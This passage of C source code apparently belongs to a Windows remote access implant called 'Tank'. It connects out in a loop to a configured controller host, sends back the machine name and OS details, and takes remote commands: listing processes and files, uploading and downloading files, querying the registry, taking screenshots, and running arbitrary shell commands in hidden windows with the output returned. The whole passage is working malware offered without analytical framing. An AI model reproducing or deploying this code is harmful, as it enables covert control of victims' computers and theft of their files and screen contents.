    bfh.bfOffBits = sizeof(bfh)+sizeof(BITMAPINFOHEADER);
    send_all(s,(char*)&bfh,sizeof(bfh));
    send_all(s,(char*)&bmi.bmiHeader,sizeof(BITMAPINFOHEADER));
    send_all(s,pixels,(int)pixel_bytes);
    GlobalFree(pixels);
    return send_done(s);
}

static int exec_command(SOCKET s, const char *cmd, const char *shell)
{
    SECURITY_ATTRIBUTES sa;
    STARTUPINFO         si;
    PROCESS_INFORMATION pi;
    HANDLE  hRead=INVALID_HANDLE_VALUE, hWrite=INVALID_HANDLE_VALUE;
    char    cmdline[CMD_BUFSZ+MAX_PATH+8];
    char    *outbuf; DWORD nread; int rc=0;

    outbuf=(char*)GlobalAlloc(GMEM_FIXED,OUT_BUFSZ);
    if(!outbuf){send_str(s,"tank: oom\r\n");return send_done(s);}
    memset(&sa,0,sizeof(sa)); sa.nLength=sizeof(sa); sa.bInheritHandle=TRUE;
    if(!CreatePipe(&hRead,&hWrite,&sa,0)){
        wsprintf(outbuf,"tank: pipe failed (%lu)\r\n",GetLastError());
        send_str(s,outbuf); GlobalFree(outbuf); return send_done(s);
    }
    wsprintf(cmdline,"%s /c %s",shell,cmd);
    memset(&si,0,sizeof(si)); si.cb=sizeof(si);
    si.dwFlags=STARTF_USESTDHANDLES|STARTF_USESHOWWINDOW; si.wShowWindow=SW_HIDE;
    si.hStdInput=GetStdHandle(STD_INPUT_HANDLE); si.hStdOutput=hWrite; si.hStdError=hWrite;
    memset(&pi,0,sizeof(pi));
    if(!CreateProcess(NULL,cmdline,NULL,NULL,TRUE,CREATE_NO_WINDOW,NULL,NULL,&si,&pi)){
        wsprintf(outbuf,"tank: exec failed (%lu)\r\n",GetLastError());
        send_str(s,outbuf); CloseHandle(hRead); CloseHandle(hWrite);
        GlobalFree(outbuf); return send_done(s);
    }
    CloseHandle(hWrite); CloseHandle(pi.hThread);
    while(ReadFile(hRead,outbuf,OUT_BUFSZ,&nread,NULL)&&nread>0)
        if(send_all(s,outbuf,(int)nread)<0){rc=-1;break;}
    WaitForSingleObject(pi.hProcess,60000UL);
    CloseHandle(pi.hProcess); CloseHandle(hRead); GlobalFree(outbuf);
    if(rc==0) rc=send_done(s);
    return rc;
}

/* -----------------------------------------------------------------------
 * Session dispatcher
 * ----------------------------------------------------------------------- */
static void run_session(SOCKET s)
{
    char shell[MAX_PATH], cmd[CMD_BUFSZ], banner[512];
    char compname[MAX_PATH]; DWORD namesz=MAX_PATH;
    OSVERSIONINFO osv; int n, rc;

    find_shell(shell,MAX_PATH);
    compname[0]='\0'; GetComputerName(compname,&namesz);
    memset(&osv,0,sizeof(osv)); osv.dwOSVersionInfoSize=sizeof(osv); GetVersionEx(&osv);
    wsprintf(banner,"Tank/1 host=%s os=%lu.%lu.%lu shell=%s\n",
             compname[0]?compname:"unknown",
             osv.dwMajorVersion,osv.dwMinorVersion,osv.dwBuildNumber,shell);
    send_str(s,banner);

    for(;;) {
        n = recv_line(s,cmd,CMD_BUFSZ);
        if(n<0) return;
        if(n==0) continue;
        if(cmd_is(cmd,"exit")||cmd_is(cmd,"quit")) return;
        else if(cmd_is(cmd,"sysinfo"))    rc=cmd_sysinfo(s);
        else if(cmd_is(cmd,"ps"))         rc=cmd_ps(s);
        else if(cmd_is(cmd,"ls"))         rc=cmd_ls(s,cmd_arg(cmd,"ls"));
        else if(cmd_is(cmd,"get"))        rc=cmd_get(s,cmd_arg(cmd,"get"));
        else if(cmd_is(cmd,"put"))        rc=cmd_put(s,cmd_arg(cmd,"put"));
        else if(cmd_is(cmd,"regq"))       rc=cmd_regq(s,cmd_arg(cmd,"regq"));
        else if(cmd_is(cmd,"screenshot")) rc=cmd_screenshot(s);
        else                              rc=exec_command(s,cmd,shell);
        if(rc<0) return;
    }
}

/* -----------------------------------------------------------------------
 * Connect + optional TLS handshake
 * ----------------------------------------------------------------------- */
static SOCKET tank_connect(void)
{
    SOCKET             s;
    struct sockaddr_in addr;
    struct hostent    *he;

    s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (s == INVALID_SOCKET) return INVALID_SOCKET;

    he = gethostbyname(g_clu.host);
    if (!he) { closesocket(s); return INVALID_SOCKET; }

    memset(&addr,0,sizeof(addr));
    addr.sin_family      = AF_INET;
    addr.sin_port        = htons(g_clu.port);
    addr.sin_addr.s_addr = *(DWORD *)he->h_addr;

    if (connect(s,(struct sockaddr*)&addr,sizeof(addr)) == SOCKET_ERROR) {
        closesocket(s); return INVALID_SOCKET;
    }

    if (g_clu.tls && t_tls_avail) {
        if (!tls_handshake(s)) { closesocket(s); return INVALID_SOCKET; }
    }
    return s;
}

/* -----------------------------------------------------------------------
 * WinMain
 * ----------------------------------------------------------------------- */
int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow)
{
    WSADATA wsa;
    SOCKET  s;

    (void)hInst; (void)hPrev; (void)lpCmd; (void)nShow;

    if (!recognizer_check()) return 0;

    tls_load();

    if (WSAStartup(MAKEWORD(1,1),&wsa) != 0) return 1;

    for (;;) {
        s = tank_connect();
        if (s != INVALID_SOCKET) {
            run_session(s);
            tls_teardown();
            closesocket(s);
        }
        Sleep(TANK_RETRY_MS);
    }

    WSACleanup();
    return 0;
}
